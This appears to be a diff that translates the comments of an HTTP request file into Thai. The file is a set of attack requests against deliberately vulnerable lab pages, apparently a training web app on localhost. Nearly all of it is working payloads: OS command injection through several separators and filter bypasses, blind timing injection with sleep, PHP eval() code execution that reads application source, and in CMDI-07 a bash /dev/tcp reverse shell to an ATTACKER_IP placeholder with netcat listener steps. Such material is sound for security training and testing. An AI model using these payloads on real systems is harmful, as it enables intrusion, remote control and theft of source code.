@@ -1,19 +1,19 @@
 ### ============================================================================
-### 04 - A1 Injection / OS Command Injection and PHP code injection
+### 04 - A1 Injection / OS Command Injection และ PHP code injection
 ###
 ###   commandi.php:       shell_exec("nslookup  " . commandi($target))   POST target
 ###   commandi_blind.php: shell_exec("ping -c 1 " . commandi($target))    POST target
 ###   php_eval.php:       @eval($_REQUEST["eval"])
 ###
-###   The web server runs as uid=33(www-data). Commands that read a password
-###   file need root, so escalate with 07-commandi.http's sudo check or the
-###   local privilege escalation bugs - plain `id` is the baseline proof.
+###   เว็บเซิร์ฟเวอร์รันด้วย uid=33(www-data) คำสั่งที่ต้องอ่านไฟล์ password
+###   ต้องใช้ root จึงต้อง escalate ด้วยการเช็ค sudo ใน 07-commandi.http
+###   หรือ bug ที่ทำ local privilege escalation - `id` คือหลักฐานพื้นฐาน
 ### ============================================================================
 
 ### ---------------------------------------------------------------------------
-### CMDI-01  Baseline - semicolon separator
-###   The classic ; break-out. "nslookup" fails either way, so the nslookup
-###   error text is expected noise - the payload output is the finding.
+### CMDI-01  Baseline - คั่นคำสั่งด้วยเซมิโคลอน
+###   การ break-out แบบคลาสสิกด้วย ; คำสั่ง "nslookup" จะล้มเหลวอยู่ดี
+###   error ของ nslookup คือ noise ที่คาดไว้ - ผลจาก payload คือสิ่งที่ต้องดู
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/commandi.php HTTP/1.1
 Host: localhost:8443
@@ -21,11 +21,11 @@ Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
 target=127.0.0.1%3B%20id&form=submit
-### Expected: 200, contains: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+### Expected: 200, ต้องมี: uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 
 ### ---------------------------------------------------------------------------
-### CMDI-02  Pipe separator - the injected output REPLACES the nslookup output
+### CMDI-02  คั่นด้วย pipe - output ที่ inject เข้าไปจะแทนที่ output ของ nslookup
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/commandi.php HTTP/1.1
 Host: localhost:8443
@@ -37,7 +37,7 @@ target=127.0.0.1%20%7C%20id&form=submit
 
 
 ### ---------------------------------------------------------------------------
-### CMDI-03  && conditional chain
+### CMDI-03  เชือนแบบเงื่อนไข &&
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/commandi.php HTTP/1.1
 Host: localhost:8443
@@ -45,13 +45,13 @@ Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
 target=127.0.0.1%20%26%26%20uname%20-a&form=submit
-### Expected: 200, Linux kernel version string in the response
+### Expected: 200, ใน response มี Linux kernel version string
 
 
 ### ---------------------------------------------------------------------------
-### CMDI-04  Single & (background) operator
-###   Included because "&" is a common filter bypass: naive filters strip "&&"
-###   or ";" but a lone "&" still runs the command.
+### CMDI-04  ตัวดำเนินการ & ตัวเดียว (background)
+###   เก็บไว้เพราะ "&" เป็น filter bypass ที่พบบ่อย ฟิลเตอร์แบบง่าย ๆ
+###   ตัด "&&" หรือ ";" ทิ้ง แต่ "&" ตัวเดียวก็ยังรันคำสั่งได้อยู่
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/commandi.php HTTP/1.1
 Host: localhost:8443
@@ -63,9 +63,9 @@ target=127.0.0.1%20%26%20id&form=submit
 
 
 ### ---------------------------------------------------------------------------
-### CMDI-05  Newline separator (%0a)
-###   A second bypass route: filters that normalise ";" and "&&" frequently
-###   forget that a bare newline is a command separator in sh.
+### CMDI-05  คั่นด้วย newline (%0a)
+###   อีกเส้นทางของ bypass: ฟิลเตอร์ที่ normalize ";" และ "&&" มักลืมไปว่า
+###   newline เปล่า ๆ ก็เป็นตัวคั่นคำสั่งใน sh
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/commandi.php HTTP/1.1
 Host: localhost:8443
@@ -77,7 +77,7 @@ target=127.0.0.1%0Aid&form=submit
 
 
 ### ---------------------------------------------------------------------------
-### CMDI-06  Read a file to prove arbitrary read, not just arbitrary exec
+### CMDI-06  อ่านไฟล์ เพื่อพิสูจน์ว่าเป็น arbitrary read ไม่ใช่แค่ arbitrary exec
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/commandi.php HTTP/1.1
 Host: localhost:8443
@@ -85,15 +85,15 @@ Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
 target=127.0.0.1%3B%20cat%20%2Fetc%2Fhostname&form=submit
-### Expected: 200, the container id string
+### Expected: 200, ได้ string ของ container id
 
 
 ### ---------------------------------------------------------------------------
-### CMDI-07  Interactive reverse shell (lab only)
-###   Replace the placeholder with a listener you control:
+### CMDI-07  Interactive reverse shell (ใช้ในแล็บเท่านั้น)
+###   แทนค่าตรงนี้ด้วย listener ที่คุณควบคุมได้:
 ###     Windows:  nc.exe -lvnp 4444
 ###     Linux:    nc -lvnp 4444
-###   Then run this request and watch the listener.
+###   แล้วส่งคำขอนี้แล้วดูที่ listener
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/commandi.php HTTP/1.1
 Host: localhost:8443
@@ -101,15 +101,15 @@ Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
 target=127.0.0.1%3B%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER_IP%2F4444%200%3E%261&form=submit
-### Expected: 200, reverse shell lands on your listener
+### Expected: 200, reverse shell ต่อเข้ามาที่ listener ของเรา
 
 
 ### ---------------------------------------------------------------------------
-### CMDI-08  BLIND command injection - out-of-band timing oracle
-###   commandi_blind.php's output is a fixed string ("Did you captured our
-###   GOLDEN packet?"), so nothing comes back in-band. Time the response
-###   instead: ~3s means the command executed.
-###   Baseline first: an un-delayed request returns in well under 1s.
+### CMDI-08  BLIND command injection - ใช้เวลาตอบกลับเป็น oracle แบบ out-of-band
+###   output ของ commandi_blind.php เป็นข้อความคงที่ ("Did you captured our
+###   GOLDEN packet?") จึงไม่มีอะไรกลับมาทางช่องทางปกติ ให้จับเวลาแทน
+###   ~3s แปลว่าคำสั่งถูกรันจริง เริ่มจาก baseline ก่อน: คำขอที่ไม่มี delay
+###   ตอบกลับไวกว่า 1s มาก
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/commandi_blind.php HTTP/1.1
 Host: localhost:8443
@@ -117,11 +117,11 @@ Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
 target=127.0.0.1&form=submit
-### Expected: 200 fast, "Did you captured our GOLDEN packet?"
+### Expected: 200 ตอบเร็ว, "Did you captured our GOLDEN packet?"
 
 
 ### ---------------------------------------------------------------------------
-### CMDI-09  BLIND - inject a 5 second sleep and compare
+### CMDI-09  BLIND - inject sleep 5 วินาทีแล้วเทียบเวลา
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/commandi_blind.php HTTP/1.1
 Host: localhost:8443
@@ -130,14 +130,14 @@ Content-Type: application/x-www-form-urlencoded
 
 target=127.0.0.1%3B%20sleep%205&form=submit
 ### EXPECT-TIME-AT-LEAST: 4000
-### Expected: 200 after ~5 seconds instead of <1s. That delta is the oracle.
+### Expected: 200 หลังรอราว 5 วินาที แทนที่จะตอบใน <1s ค่าต่างนี้คือ oracle
 
 
 ### ---------------------------------------------------------------------------
-### CODE-01  PHP code injection via eval() - system("id")
-###   php_eval.php passes $_REQUEST straight into eval(). This is not command
-###   injection, it is arbitrary PHP: no shell, no escaping, full language.
-###   Note this is the same class of bug as xss_eval.php but server-side.
+### CODE-01  PHP code injection ผ่าน eval() - system("id")
+###   php_eval.php ส่ง $_REQUEST เข้า eval() ตรง ๆ นี่ไม่ใช่ command
+###   injection แต่เป็น PHP แบบอิสระ: ไม่มี shell, ไม่ต้อง escape, ได้ทั้งภาษา
+###   บั๊กคลาสเดียวกับ xss_eval.php แต่เกิดฝั่ง server
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/php_eval.php HTTP/1.1
 Host: localhost:8443
@@ -149,7 +149,7 @@ eval=system(%22id%22)%3B
 
 
 ### ---------------------------------------------------------------------------
-### CODE-02  Arbitrary PHP - read the app source from inside PHP
+### CODE-02  Arbitrary PHP - อ่าน source ของแอปจากใน PHP
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/php_eval.php HTTP/1.1
 Host: localhost:8443
@@ -157,4 +157,4 @@ Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
 eval=echo%20file_get_contents(%22%2Fapp%2Fadmin%2Fsettings.php%22)%3B
-### Expected: 200, the full plaintext source of settings.php
+### Expected: 200, ได้ source ของ settings.php แบบ plaintext ทั้งไฟล์
